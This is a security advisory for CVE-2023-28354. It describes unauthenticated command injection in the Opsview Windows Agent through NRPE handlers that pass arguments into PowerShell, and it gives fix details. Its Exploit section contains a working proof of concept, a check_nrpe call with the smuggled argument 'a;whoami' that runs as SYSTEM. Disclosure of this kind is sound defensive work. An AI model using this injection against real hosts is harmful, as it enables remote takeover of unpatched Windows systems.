# CVE-2023-28354
## Vulnerability Description
A vulnerability has been identified in Opsview Monitor Agent 6.8 that allows an unauthenticated remote attacker to execute arbitrary commands. An unauthenticated attacker can exploit this vulnerability on Windows by supplying an command-line escape sequence when calling default Opsview Agent Monitor scripts, allowing execution of arbitrary system commands.

## Description
The Opsview Agent service on Windows runs as Local System by default. This default configuration also contains several NRPE handlers, allowing administrators to call scripts which execute predefined functions such as querying system status, file age, or mountpoints. These handlers are configured to accept arguments (`allow_arguments=1`) as well as command-line escape characters (`allow_nasty_meta_characters=1`).

The NRPE handlers are insecurely configured in the affected version of the Opsview Agent to echo command input and any arguments from a remote user calling the script directly into Powershell.

A default `opsview.ini` configuration file:
```
75: [External Script]
76: ;# COMMAND ARGUMENT PROCESSING
77: ;  This option determines whether or not the NRPE daemon will allow clients to specify arguments to commands that are executed.
78: allow_arguments=1
79: 
80: ;# COMMAND ALLOW NASTY META CHARS
81: ;  This option determines whether or not the NRPE daemon will allow clients to specify nasty (as in |`&><'"\[]{}) characters in arguments.
82: allow_nasty_meta_chars=1

[...]snip[...]

94: [NRPE Handlers]
95: check_mountpoint=cmd /c echo scripts\check_mountpoint.ps1 $ARG1$; exit($lastexitcode) | PowerShell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command -
96: check_services_orig=cmd /c echo scripts\check_services.ps1 $ARG1$; exit($lastexitcode) | PowerShell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command -
97: check_services=scripts\check_services.exe $ARG1$
98: check_clustergroup=cmd /c echo scripts\check_clustergroup.ps1 $ARG1$; exit($lastexitcode) | PowerShell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command -
99: check_windows_base_orig=cmd /c echo scripts\check_windows_base.ps1 $ARG1$; exit($lastexitcode) | PowerShell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command -
100: check_windows_base=scripts\check_windows_base.exe $ARG1$
101: check_msmq=cmd /c echo scripts\check_msmq.ps1 $ARG1$; exit($lastexitcode) | PowerShell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command -
102: check_ms_iis=cmd /c echo scripts\check_ms_iis.ps1 $ARG1$; exit($lastexitcode) | PowerShell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command -
103: check_ms_dns=cmd /c echo scripts\check_ms_dns.ps1 $ARG1$; exit($lastexitcode) | PowerShell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command -
104: check_ms_sql_database_states=cmd /c echo scripts\check_ms_sql_database_states.ps1 $ARG1$; exit($lastexitcode) | PowerShell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command -
105: check_ms_sql_performance=cmd /c echo scripts\check_ms_sql_performance.ps1 $ARG1$; exit($lastexitcode) | PowerShell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command -
106: check_ms_sql_system=cmd /c echo scripts\check_ms_sql_system.ps1 $ARG1$; exit($lastexitcode) | PowerShell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command -
107: check_ms_hyperv_server=cmd /c echo scripts\check_ms_hyperv_server.ps1 $ARG1$; exit($lastexitcode) | PowerShell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command -
108: check_microsoft_exchange2016_backpressure=cmd /c echo scripts\check_microsoft_exchange2016_backpressure.ps1 $ARG1$; exit($lastexitcode) | PowerShell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command -
109: check_microsoft_exchange2013_backpressure=cmd /c echo scripts\check_microsoft_exchange2013_backpressure.ps1 $ARG1$; exit($lastexitcode) | PowerShell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command -
110: check_microsoft_exchange_counters=cmd /c echo scripts\check_microsoft_exchange_counters.ps1 $ARG1$; exit($lastexitcode) | PowerShell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command -
111: check_microsoft_exchange=cmd /c echo scripts\check_microsoft_exchange.ps1 $ARG1$; exit($lastexitcode) | PowerShell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command -
112: check_active_directory=cmd /c echo scripts\check_active_directory.ps1 $ARG1$; exit($lastexitcode) | PowerShell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command -
113: check_windows_updates=cmd /c echo scripts\check_windows_updates.ps1 $ARG1$; exit($lastexitcode) | PowerShell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command -
114: check_file_age=cmd /c echo scripts\checkfileage.ps1 $ARG1$; exit($lastexitcode) | PowerShell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command -
115: check_counter=cmd /c echo scripts\check_counter.ps1 $ARG1$; exit($lastexitcode) | PowerShell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command -
116: check_xen=cmd /c echo scripts\check_xen.ps1 $ARG1$; exit($lastexitcode) | PowerShell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command -
117: check_horizon=cmd /c echo scripts\check_horizon.ps1 $ARG1$; exit($lastexitcode) | PowerShell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command -
118: check_xencloud=cmd /c echo scripts\check_xencloud.ps1 $ARG1$; exit($lastexitcode) | PowerShell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command -
119: check_wineventlog=cmd /c echo scripts\check_wineventlogn.ps1 $ARG1$; exit($lastexitcode) | PowerShell.exe -NoProfile -NonInteractive -ExecutionPolicy Bypass -Command -
```
## Exploit
Attacking default installations from Linux can be achieved with the Nagios `check_nrpe` utility to interact with a known-handler, supplying an command-line escape and desired command to be run remotely as an argument.

For example:
```
$ /usr/lib/nagios/plugins/check_nrpe -H 192.168.0.15 -c check_file_age -a "a;whoami"
CRITICAL: File a does not exist
nt authority\system
```

## Affected Products
Opsview Windows Agent 28-09-2022, and x64 and Win32 releases.

Remote fingerprint for vulnerable product:
`OpsviewAgent 0.3.9.700 2022-09-28; osname=windows`

## Fix
Upgrade to Opsview Windows Agent 09-03-2023 release.

Note: The Opsview Agent will not receive any further updates as per ITRS's notification. It is instead recommended to upgrade to the ITRS Infrastructure Agent.

[Download Link](https://resources.itrsgroup.com/downloads)
